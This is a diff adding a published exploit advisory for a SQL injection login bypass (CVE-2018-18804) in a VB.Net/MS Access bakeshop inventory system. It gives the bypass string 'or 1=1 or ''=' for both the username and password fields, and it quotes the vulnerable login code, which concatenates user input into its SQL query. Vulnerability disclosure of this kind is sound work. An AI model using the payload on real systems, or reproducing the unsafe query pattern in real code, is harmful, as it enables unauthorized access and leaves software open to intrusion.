@@ -1,0 +1,73 @@
+# Exploit Title: Bakeshop Inventory System in VB.Net and MS Access Database 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/bakeshopinventory1.0.zip
+# Version: 1.0
+# Category: Windows
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18804
+
+# POC: 
+# 1)
+# User: 'or 1=1 or ''='
+# Pass: 'or 1=1 or ''='
+# 
+# https://2.bp.blogspot.com/-xjiRUlpkNGc/W9Ywmp79JpI/AAAAAAAAENs/3UDWxFvuTfcJrEKDU9TUxJRpoT8T6yLLwCLcBGAs/s1600/sql4.png
+# 
+#[PATH]/include/publicfunction.vb
+#....
+#237     Public Sub LoginUser(ByVal userid As Object, ByVal pass As Object)
+#238         Try
+#239             con.Open()
+#240 
+#241             cmd = New OleDb.OleDbCommand
+#242             With cmd
+#243                 .Connection = con
+#244                 .CommandText = "SELECT * FROM tblUser WHERE U_UNAME ='" & userid.Text & "' AND U_PASS = '" & pass.Text & "'"
+#245             End With
+#246 
+#247             da = New OleDb.OleDbDataAdapter
+#248             da.SelectCommand = cmd
+#249             dt = New DataTable
+#250             da.Fill(dt)
+#251 
+#252             If dt.Rows.Count > 0 Then
+#253 
+#254                 If dt.Rows(0).Item("U_TYPE") = "Administrator" Then
+#255 
+#256                     MsgBox("You login as administrator!!")
+#257 
+#258                     ShowForm(LoginForm1, Form1)
+#259 
+#260 
+#261                     LoginForm1.Hide()
+#262                 ElseIf dt.Rows(0).Item("U_TYPE") = "Staff" Then
+#263 
+#264                     MsgBox("You login as Staff!!")
+#265 
+#266                     With Form1
+#267                         '.ManageUsersToolStripMenuItem.Visible = False
+#268 
+#269                     End With
+#270 
+#271                     ShowForm(LoginForm1, Form1)
+#272 
+#273 
+#274                     LoginForm1.Hide()
+#275                 End If 
+#276 
+#277             Else
+#278                 MsgBox("Account does not exists.", MsgBoxStyle.Exclamation)
+#279             End If
+#280 
+#281         Catch ex As Exception
+#282 
+#283             MsgBox(ex.Message)
+#284         Finally
+#285             con.Close()
+#286             da.Dispose()
+#287         End Try
+#288     End Sub
+#....
